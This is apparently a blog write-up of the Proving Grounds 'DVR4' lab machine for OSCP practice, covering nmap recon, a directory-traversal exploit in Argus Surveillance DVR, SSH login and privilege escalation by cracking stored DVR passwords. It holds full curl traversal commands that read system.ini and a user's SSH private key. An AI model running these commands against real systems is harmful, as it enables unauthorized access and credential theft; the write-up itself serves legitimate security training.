---
title: PG-DVR4
published: 2025-02-24
toc: true
draft: false
tags: 
    - "OSCP Prep"
    - "LFI"
---

```
Scope:
192.168.219.179
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -vvvv -p- dvr4 -sT -T5 --min-rate=5000

PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
5040/tcp  open  unknown       syn-ack
7680/tcp  open  pando-pub?    syn-ack
8080/tcp  open  http-proxy    syn-ack
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC

```


## 445/TCP - SMB

![](attachments/c93c2cf820f120468c4da2dc0b6183a5.png)

## 8080/TCP - HTTP

![](attachments/d9fcc30e4e41e9fe543ad8893d383ee3.png)

I look up exploits matching the service:

![](attachments/f4977a08cd478ad5974fe27104e9be01.png)

I actually get quite a lot of them, let's try out the **Directory Traversal** one.

![](attachments/1727fbb57802786741496cb71589c895.png)

```bash
# PoC

curl "http://dvr4:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

![](attachments/add47350bbb38a0c75f48a7a7b36e49e.png)

We indeed get the intended result.

Back on the website we find the user we're looking for:

![](attachments/a47da0ec30e1d9d5bfc5df773e091bea.png)

We want to get the ssh key of *viewer* so we can then log in.

```bash
curl "http://dvr4:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

![](attachments/07ff7964bb71e7dae28ae4a0937a69f3.png)

Now that we have the `id_rsa` key, we can use it to log into SSH.


# Foothold

![](attachments/260c380d461f5331759eddb56069c6cb.png)

![](attachments/54fb5758053c60043d9710c39855b65a.png)

EZ PZ

Let's check out the home directory:

![](attachments/3dcb924454908b274b4b535ab447de6c.png)

We notice the user already has `nc.exe` as well as `psexec.exe` in here... Might be a clue.

Let's snatch the `local.txt` first.

## local.txt

![](attachments/6277cbf397715f715404e448d5ba3346.png)


# Privilege Escalation

## PoC

We also find another PoC:

![](attachments/828741fd3638361b9d246b6b45b419da.png)

In here we see a mention of the `.ini` file, let's check it out.

![](attachments/aa4a657fa19b9ddabb7debb08c469701.png)

![](attachments/a4217bd840d88203bb038f972064bb31.png)

![](attachments/a8cb2fa6b292acb717fde887a3711fac.png)

```
ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
```

![](attachments/f214445aca1c813aa3440ffa717aef2e.png)

![](attachments/1db6b13f4670fc5b91f4b28488d2757e.png)

Notice the **Unknown** character here.

:::note
It is possible that we might have to brute force the last character if this is the correct password.
:::

```
14WatchD0g
```

![](attachments/f110cb4642c152f5b18753f61d4b30aa.png)

```
ImWatchingYou
```

![](attachments/9e6317a4fff03729857504febc91a553.png)

:::fail
Neither worked.
:::

Let's try the `nc.exe` binary then, with the help of `runas`.

![](attachments/dd5fa1da2e8b797a990906ba2bc1b980.png)

:::fail
Again no success, let's try to brute force the last **Unknown** character that we found previously.
:::

After some tries it worked:

![](attachments/f0660895d041206fe4a91b34cf8ca26c.png)

![](attachments/eb5b6f3815d52f706399be54639278ab.png)

:::note
The correct password was `14WatchD0g$`
:::


## proof.txt

![](attachments/115e7c1404fae67346215f7b06f3d3f2.png)

---